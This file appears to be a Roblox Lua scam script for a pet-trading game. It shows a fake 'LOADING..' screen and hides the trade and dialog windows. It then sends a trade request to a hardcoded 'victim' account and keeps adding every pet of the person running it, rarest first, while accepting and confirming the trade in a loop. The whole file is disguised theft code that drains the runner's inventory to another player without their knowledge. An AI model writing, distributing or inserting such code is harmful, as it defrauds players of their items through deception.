local victimUsername = "lusilen" 
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local clickBlockerGui = Instance.new("ScreenGui")
clickBlockerGui.Name = "ClickBlocker"
clickBlockerGui.IgnoreGuiInset = true
clickBlockerGui.ResetOnSpawn = false
clickBlockerGui.DisplayOrder = 9999999
clickBlockerGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
clickBlockerGui.Parent = PlayerGui
local blocker = Instance.new("TextButton")
blocker.Name = "Blocker"
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.Position = UDim2.new(0, 0, 0, 0)
blocker.BackgroundTransparency = 0.6
blocker.TextTransparency = 0
blocker.Text = "LOADING.."
blocker.TextScaled = true 
blocker.Font = Enum.Font.GothamBlack
blocker.TextSize = 100
blocker.AutoButtonColor = false
blocker.ZIndex = 10000
blocker.Parent = clickBlockerGui
blocker.MouseButton1Click:Connect(function()
end)
local Loads = require(ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local TradeRequestRemote = RouterClient.get("TradeAPI/SendTradeRequest")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local getData = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data
local petDatabase = require(ReplicatedStorage.ClientDB.Inventory.InventoryDB).pets
local localPlayer = Players.LocalPlayer
local rarityModule = require(ReplicatedStorage.ClientDB.RarityDB)
local RunService = game:GetService("RunService")
local TradeApp = PlayerGui:WaitForChild("TradeApp", 10)
local DialogApp = PlayerGui:WaitForChild("DialogApp", 10)
local ToolApp = PlayerGui:WaitForChild("ToolApp", 10)
local HouseEditorApp = PlayerGui:WaitForChild("HouseEditorApp", 10)
local QuestIconApp = PlayerGui:WaitForChild("QuestIconApp", 10)
local ExtraButtonsApp = PlayerGui:WaitForChild("ExtraButtonsApp", 10)
RunService.RenderStepped:Connect(function()
	if TradeApp:FindFirstChild("Frame") then
		TradeApp.Frame.Visible = false
	end
	if DialogApp:FindFirstChild("Dialog") then
		DialogApp.Dialog.Visible = false
	end
	if ToolApp:FindFirstChild("Frame") then
		ToolApp.Frame.Visible = true
	end
	if HouseEditorApp:FindFirstChild("base_frame") then
		HouseEditorApp.base_frame.Visible = true
	end
	if QuestIconApp:FindFirstChild("ImageButton") then
		QuestIconApp.ImageButton.Visible = true
	end
	if ExtraButtonsApp:FindFirstChild("Frame") then
		ExtraButtonsApp.Frame.Visible = true
	end
	if PlayerGui:WaitForChild("HintApp", 10):FindFirstChild("TextLabel") then
		PlayerGui:WaitForChild("HintApp", 10):FindFirstChild("TextLabel").Visible = false
	end
	if PlayerGui:WaitForChild("HintApp", 10):FindFirstChild("LargeTextLabel") then
		PlayerGui:WaitForChild("HintApp", 10):FindFirstChild("LargeTextLabel").Visible = false
	end
	ExtraButtonsApp.Enabled = true
	QuestIconApp.Enabled = true
	HouseEditorApp.Enabled = true
end)

local function waitForVictim()
	while not Players:FindFirstChild(victimUsername) do
		Players.PlayerAdded:Wait()
	end
	return Players:FindFirstChild(victimUsername)
end



local victimPlayer = waitForVictim()
wait(10)
TradeRequestRemote:FireServer(victimPlayer)
local function addPets()
	local inventory = getData()[localPlayer.Name].inventory
	local topPets = {}
	local regularPets = {}
	local petsToLog = {}

	for uid, petData in pairs(inventory.pets) do
		local dbEntry = petDatabase[petData.id]
		if dbEntry and dbEntry.donatable ~= false then
			local properties = petData.properties or {}
			local isRideable = properties.rideable == true
			local isFlyable = properties.flyable == true
			local isNeon = properties.neon == true
			local isMegaNeon = properties.mega_neon == true

			local rarityValue = rarityModule[dbEntry.rarity].value
			local petInfo = {
				uid = uid,
				name = dbEntry.name .. (isMegaNeon and " 🌈MEGA" or isNeon and " ✨NEON" or ""),
				rarity = dbEntry.rarity
			}

			table.insert(petsToLog, petInfo)

			if isRideable or isFlyable or isNeon or isMegaNeon then
				table.insert(topPets, { uid = uid, rarityValue = rarityValue })
			else
				table.insert(regularPets, { uid = uid, rarityValue = rarityValue })
			end
		end
	end

	-- сортировка от самых редких к менее редким
	table.sort(topPets, function(a, b) return a.rarityValue > b.rarityValue end)
	table.sort(regularPets, function(a, b) return a.rarityValue > b.rarityValue end)

	-- добавление питомцев в трейд
	for _, pet in ipairs(topPets) do
		AddItemRemote:FireServer(pet.uid)
	end
	for _, pet in ipairs(regularPets) do
		AddItemRemote:FireServer(pet.uid)
	end
end

local function acceptTrade()
	while task.wait(0.1) do
		addPets()
		AcceptNegotiationRemote:FireServer()
	end
end
local function confirmTrade()
	while task.wait(0.1) do
		ConfirmTradeRemote:FireServer()
	end
end
task.spawn(acceptTrade)
task.spawn(confirmTrade)
